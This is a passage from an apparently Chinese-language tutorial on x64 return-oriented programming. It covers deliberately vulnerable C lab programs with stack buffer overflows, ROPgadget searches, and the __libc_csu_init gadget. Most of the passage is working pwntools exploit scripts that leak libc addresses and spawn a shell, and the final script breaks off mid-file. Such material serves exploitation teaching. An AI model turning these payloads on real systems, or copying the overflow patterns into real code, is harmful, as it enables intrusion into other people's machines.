<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = <span class="built_in">dlopen</span>(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,<span class="built_in">dlsym</span>(handle,<span class="string">&quot;system&quot;</span>));</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">systemaddr</span>();</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">vulnerable_function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level4.c -o level4 -ldl</span><br></pre></td></tr></table></figure>
<p>首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行system(“/bin/sh”)。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下level4中所有pop ret的gadgets。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary level4 --only &quot;pop|ret&quot; </span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00000000004006d2 : pop rbp ; ret</span><br><span class="line">0x00000000004006d1 : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400585 : ret</span><br><span class="line">0x0000000000400735 : ret 0xbdb8</span><br></pre></td></tr></table></figure>

<p>结果并不理想，因为程序比较小，在目标程序中并不能找到<code>pop rdi; ret</code>这个gadget。怎么办呢？解决方案是寻找libc.so中的gadgets。因为程序本身会load libc.so到内存中并且会打印system()的地址。所以当我们找到gadgets后可以通过system()计算出偏移量后调用对应的gadgets。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi</span><br><span class="line">0x000000000001f27d : pop rdi ; pop rbp ; ret</span><br><span class="line">0x00000000000205cd : pop rdi ; pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000073033 : pop rdi ; pop rbx ; ret</span><br><span class="line">0x0000000000022a12 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>这次我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>

<p>另外，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary libc.so.6 --only &quot;pop|call&quot; | grep rdi</span><br><span class="line">0x000000000012da1d : call qword ptr [rdi]</span><br><span class="line">0x0000000000187113 : call qword ptr [rdx + rdi + 0x8f10001]</span><br><span class="line">0x00000000000f1f04 : call rdi</span><br><span class="line">0x00000000000f4739 : pop rax ; pop rdi ; call rax</span><br><span class="line">0x00000000000f473a : pop rdi ; call rax</span><br></pre></td></tr></table></figure>

<p>通过搜索结果我们发现，<code>0x00000000000f4739 : pop rax ; pop rdi ; call rax</code>也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span> + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br></pre></td></tr></table></figure>

<p>所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line">binsh_addr_offset = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)) -libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr_offset = &quot;</span> + <span class="built_in">hex</span>(binsh_addr_offset)</span><br><span class="line"></span><br><span class="line">pop_ret_offset = <span class="number">0x0000000000022a12</span> - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;pop_ret_offset = &quot;</span> + <span class="built_in">hex</span>(pop_ret_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_offset = 0x00000000000f4739 - libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n##########receiving system addr##########\n&quot;</span></span><br><span class="line">system_addr_str = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">system_addr = <span class="built_in">int</span>(system_addr_str,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr = &quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = system_addr + binsh_addr_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr = &quot;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_ret_addr = system_addr + pop_ret_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;pop_ret_addr = &quot;</span> + <span class="built_in">hex</span>(pop_ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_addr = system_addr + pop_pop_call_offset</span></span><br><span class="line"><span class="comment">#print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) </span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n##########sending payload##########\n&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python exp6.py </span><br><span class="line">[+] Started program <span class="string">&#x27;./level4&#x27;</span></span><br><span class="line">binsh_addr_offset = 0x134d41</span><br><span class="line">pop_ret_offset = -0x22d1e</span><br><span class="line"></span><br><span class="line"><span class="comment">##########receiving system addr##########</span></span><br><span class="line"></span><br><span class="line">system_addr = 0x7f6f754d8730</span><br><span class="line">binsh_addr = 0x7f6f7560d471</span><br><span class="line">pop_ret_addr = 0x7f6f754b5a12</span><br><span class="line"></span><br><span class="line"><span class="comment">##########sending payload##########</span></span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">mzheng</span><br></pre></td></tr></table></figure>

<h2 id="0x04-通用gadgets"><a href="#0x04-通用gadgets" class="headerlink" title="0x04 通用gadgets"></a>0x04 通用gadgets</h2><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p>
<p>为了方便大家学习x64下的ROP，level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">vulnerable_function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于<code>pop rdi, ret</code>,<code>pop rsi, ret</code>这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用<code>objdump -d ./level5</code>观察一下<code>__libc_csu_init()</code>这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005a0:   48 89 6c 24 d8          mov    %rbp,-0x28(%rsp)</span><br><span class="line">  4005a5:   4c 89 64 24 e0          mov    %r12,-0x20(%rsp)</span><br><span class="line">  4005aa:   48 8d 2d 73 08 20 00    lea    0x200873(%rip),%rbp        # 600e24 &lt;__init_array_end&gt;</span><br><span class="line">  4005b1:   4c 8d 25 6c 08 20 00    lea    0x20086c(%rip),%r12        # 600e24 &lt;__init_array_end&gt;</span><br><span class="line">  4005b8:   4c 89 6c 24 e8          mov    %r13,-0x18(%rsp)</span><br><span class="line">  4005bd:   4c 89 74 24 f0          mov    %r14,-0x10(%rsp)</span><br><span class="line">  4005c2:   4c 89 7c 24 f8          mov    %r15,-0x8(%rsp)</span><br><span class="line">  4005c7:   48 89 5c 24 d0          mov    %rbx,-0x30(%rsp)</span><br><span class="line">  4005cc:   48 83 ec 38             sub    $0x38,%rsp</span><br><span class="line">  4005d0:   4c 29 e5                sub    %r12,%rbp</span><br><span class="line">  4005d3:   41 89 fd                mov    %edi,%r13d</span><br><span class="line">  4005d6:   49 89 f6                mov    %rsi,%r14</span><br><span class="line">  4005d9:   48 c1 fd 03             sar    $0x3,%rbp</span><br><span class="line">  4005dd:   49 89 d7                mov    %rdx,%r15</span><br><span class="line">  4005e0:   e8 1b fe ff ff          callq  400400 &lt;_init&gt;</span><br><span class="line">  4005e5:   48 85 ed                test   %rbp,%rbp</span><br><span class="line">  4005e8:   74 1c                   je     400606 &lt;__libc_csu_init+0x66&gt;</span><br><span class="line">  4005ea:   31 db                   xor    %ebx,%ebx</span><br><span class="line">  4005ec:   0f 1f 40 00             nopl   0x0(%rax)</span><br><span class="line">  4005f0:   4c 89 fa                mov    %r15,%rdx</span><br><span class="line">  4005f3:   4c 89 f6                mov    %r14,%rsi</span><br><span class="line">  4005f6:   44 89 ef                mov    %r13d,%edi</span><br><span class="line">  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)</span><br><span class="line">  4005fd:   48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  400601:   48 39 eb                cmp    %rbp,%rbx</span><br><span class="line">  400604:   75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span><br><span class="line">  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx</span><br><span class="line">  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp</span><br><span class="line">  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12</span><br><span class="line">  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13</span><br><span class="line">  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14</span><br><span class="line">  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15</span><br><span class="line">  400624:   48 83 c4 38             add    $0x38,%rsp</span><br><span class="line">  400628:   c3                      retq   </span><br></pre></td></tr></table></figure>

<p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完<code>call qword ptr [r12+rbx*8]</code>之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们接下来构造ROP链。</p>
<p>我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是<code>call qword ptr [r12+rbx*8]</code>，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload1 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload1 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(main)</span><br></pre></td></tr></table></figure>

<p>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=bss_addr, rdx=16)</span></span><br><span class="line">payload2 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload2 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main)</span><br></pre></td></tr></table></figure>

<p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</span></span><br><span class="line">payload3 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload3 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main)</span><br></pre></td></tr></table></figure>

<p>最终exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;got_write: &quot;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;got_read: &quot;</span> + <span class="built_in">hex</span>(got_read)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400564</span></span><br><span class="line"></span><br><span class="line">off_system_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;off_system_addr: &quot;</span> + <span class="built_in">hex</span>(off_system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload1 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload1 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload1#############\n&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr: &quot;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - off_system_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=bss_addr, rdx=16)</span></span><br><span class="line">payload2 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload2 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload2#############\n&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span 